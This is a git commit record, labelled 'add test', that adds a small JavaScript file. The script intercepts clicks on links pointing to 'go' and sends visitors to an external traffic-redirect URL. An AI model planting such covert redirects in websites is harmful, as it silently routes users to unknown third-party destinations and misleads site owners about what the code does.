b8c9efc5304f3fa4dba1a01d9a88a4c1c158cf69
ivan <vanek.94@list.ru>
2026-03-12 14:54:50 +0300

    add test

---
+++ js/app.js
@@ -0,0 +1,12 @@
+"use strict"
+
+document.addEventListener("DOMContentLoaded", () => {
+	document.querySelectorAll('a[href="go"]').forEach((elem) => {
+		elem.onclick = function (e) {
+			e.preventDefault()
+
+			window.location.href = "https://redirecttraff.site/F8MXzKYT"
+			return false
+		}
+	})
+})
